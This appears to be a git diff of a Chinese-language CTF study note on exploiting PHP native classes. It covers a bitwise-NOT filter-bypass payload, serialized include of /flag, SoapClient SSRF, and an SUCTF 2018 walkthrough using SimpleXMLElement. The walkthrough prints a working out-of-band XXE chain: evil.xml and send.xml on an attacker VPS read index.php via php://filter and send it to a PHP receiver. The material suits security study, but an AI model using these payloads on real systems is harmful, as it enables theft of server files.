@@ -57,7 +57,6 @@ echo $c;
 `php5、php7
 `开启报错的情况下
 
-
 ```php
 <?php
 highlight_file(__FILE__);
@@ -171,7 +170,6 @@ md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toStr
 
 ![700](assets/php原生类利用/file-20251212232247762.png)
 
-  
 
 还需要过滤掉小括号和引号
 
@@ -186,8 +184,8 @@ C:\Users\Administrator>php -r "echo urlencode(~'phpinfo');"
 Payload:?code=(~%8F%97%8F%96%91%99%90)();
 ```
 
-```txt
-将EXP写入
+```php
+//将EXP写入
 $cmd='/flag';
 $cmd=urlencode(~$cmd);
 $str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
@@ -200,9 +198,9 @@ echo(urlencode(serialize($c)));
 ?>
 ```
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQ1ZmViYTYzNTJmNjg5MDc3MjIwODU4OWIwNjJlY2Nfb1F3T2RnM1JIenk4ZDR5bkphM2xkbm9TWVRucUp5RVhfVG9rZW46SFN1emI4Tzdkb2p6MkR4NzYwU2NhMERTbk9iXzE3NjQ1MzA3NTk6MTc2NDUzNDM1OV9WNA)
+![](assets/php原生类利用/file-20251215231830508.png)
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDY4MjliMjk0YzgxYzY3OTNiNTVlMDlhZGUxMDlkOThfdDg1dkJrRmlIblVHVlhXcGtUYWI5ZElzVlJzQmhLRlFfVG9rZW46R0FFbGJMSG5Ib2pWTWp4S1hPcGNEQXBXbmFmXzE3NjQ1MzA3NTk6MTc2NDUzNDM1OV9WNA)
+![](assets/php原生类利用/file-20251215231843418.png)
 
 # 利用SoapClient::__Call进行SSRF
 
@@ -522,12 +520,13 @@ foreach ($obj as $content) {
 ## [SUCTF 2018]Homework
 进入题目，随便注册一个账号，登录作业平台。看到一个 `calc` 计算器类的代码。有两个按钮，一个用于调用 `calc` 类实现两位数的四则运算。另一个用于上传文件，提交代码。
 
+![700](assets/php原生类利用/file-20251215230758251.png)
 
-
-![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180254-ee1ea4ce-9075-1.png)
+![700](assets/php原生类利用/file-20251215230806635.png)
 
 `calc` 计算器类的代码为：
 
+```php
 <?php 
 class calc{
     function __construct__(){
@@ -563,17 +562,21 @@ class calc{
     }
 }
 ?>
+```
+
 
 我们点击calc按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码可知module为调用的类，args为类的构造方法的参数：
 
-![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180254-ee40db3e-9075-1.png)
+![700](assets/php原生类利用/file-20251215230901489.png)
 
 所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。
 
 首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。
 
-evil.xml：
 
+
+```xml
+# evil.xml
 <?xml version="1.0"?>
 <!DOCTYPE ANY[
 <!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml">
@@ -581,26 +584,35 @@ evil.xml：
 %all;
 %send;
 ]>
+```
 
-send.xml：
+```xml
+# send.xml
 
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">
 
-send.php：
+```
+
+```php
+# send.php
 
 <?php 
 file_put_contents("result.txt", $_GET['file']) ;
 ?>
+```
 
 然后在url中构造如下：
 
-/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
+```http
 
+/show.php?module=SimpleXMLElement&args[]=http://112.124.xx.xx/evil.xml&args[]=2&args[]=true
+
+```
 这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。
 
 如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：
 
-![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180255-ee78f938-9075-1.png)
+![](assets/php原生类利用/file-20251215231144654.png)
 
 后续解题过程就不写了。
